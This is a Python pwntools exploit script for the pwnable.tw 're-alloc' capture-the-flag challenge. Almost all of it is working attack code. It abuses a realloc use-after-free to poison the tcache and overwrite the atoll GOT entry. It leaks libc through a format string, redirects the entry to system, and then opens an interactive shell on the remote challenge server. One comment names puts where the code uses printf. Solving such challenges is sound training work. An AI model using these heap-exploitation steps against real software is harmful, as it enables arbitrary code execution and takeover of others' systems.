from pwn import *

context.arch = "amd64"
context.terminal = ["tmux","splitw","-h"]
context.log_level = "debug"
def choice(io,ch):
    io.recvuntil(b"Your choice: ")
    io.sendline(str(ch).encode())

def Index(io,idx):
    io.recvuntil(b"Index:")
    io.send(str(idx).encode())

def Size(io, sz):
    io.recvuntil(b"Size:")
    io.send(str(sz).encode())

def Data(io, content):
    io.recvuntil(b"Data:")
    io.send(content)

def allocate(io, idx, size, content):
    choice(io, 1)
    Index(io, idx)
    Size(io, size)
    Data(io, content)

def reallocate(io, idx, size, content):
    choice(io,2)
    Index(io, idx)
    Size(io, size)
    if size != 0:
        Data(io,content)

def rfree(io, idx):
    choice(io,3)
    Index(io, idx)

def demon_off_by_null(io):
    allocate(io, 0, 0x18, b"a"*0x10)
    allocate(io, 1, 0x18, b"a"*0x10)
    rfree(io, 0)
    allocate(io, 0, 0x18, b"a"*0x10 + p64(0x21))

def demon_reallocate_UAF(io:process,HEAP):
    allocate(io, 0, 0x10, b"a"*0x10)
    ptr_before = u64(io.leak(HEAP,8))
    print("allocate done")
    reallocate(io, 0, 0, b"")
    print("reallocate done")
    ptr_after = u64(io.leak(HEAP,8))
    print(f"before: {hex(ptr_before)}")
    print(f"after: {hex(ptr_after)}")
    # reallocate(io,0,0x18,b"USE After Free")

def UAF(io,idx,size,content):
    allocate(io,idx,size,b"a")
    reallocate(io,idx,0,b"")
    reallocate(io,idx,size,content)

def tcache_poisoning(io,_bin):
    addr = _bin.got["atoll"]
    content = p64(addr) + p64(0)
    UAF(io, 0, 0x20, content)
    allocate(io,1,0x20,content)
    reallocate(io, 0, 0x40, content)
    rfree(io,0)
    reallocate(io,1,0x40, content)
    rfree(io,1)

    UAF(io, 1, 0x30, content)
    allocate(io,0,0x30,content)
    reallocate(io,1,0x40,content)
    rfree(io,1)
    reallocate(io,0,0x40,content)
    rfree(io,0)

def leak_libc(io,_bin):
    # call after tcache poisonning
    allocate(io,0,0x20,p64(_bin.plt["printf"]))
    # allocate(io,"%21$p",0x10,b"a")
    rfree(io,"%21$p" )
    offset = 0x26b6b
    return int(io.recvuntil(b"Invalid !").split(b"\n")[0].strip(b"Invalid !"),16)-offset

def ret2system(io,_bin,libc):
    allocate(io,"1\x00","%.48d\x00",p64(libc.symbols["system"]))
    rfree(io, "/bin/sh\x00")


DEBUG = False

if __name__ == "__main__":
    if DEBUG:
        io = process("./re-alloc")
    else:
        io = remote("chall.pwnable.tw",10106)

    _bin = ELF("./re-alloc")
    libc = ELF("./libc-9bb401974abeef59efcdd0ae35c5fc0ce63d3e7b.so")
    HEAP = _bin.symbols["heap"]

    tcache_poisoning(io,_bin)
    
    # after tcache poisoning, now got["atoll"] = plt["puts"], so atoll will lead to leak of libc
    libc.address = leak_libc(io,_bin)
    print(f"leaked libc at : {hex(libc.address)}")

    ret2system(io,_bin,libc)
    # reallocate(io,"1\x00",b"%.32d\x00", p64(libc.symbols['system']))
    # rfree(io,"1\x00")
    # allocate(io,"1", b"%.26d", p64(libc.symbols['system']))

    # gdb.attach(io)
    io.interactive()
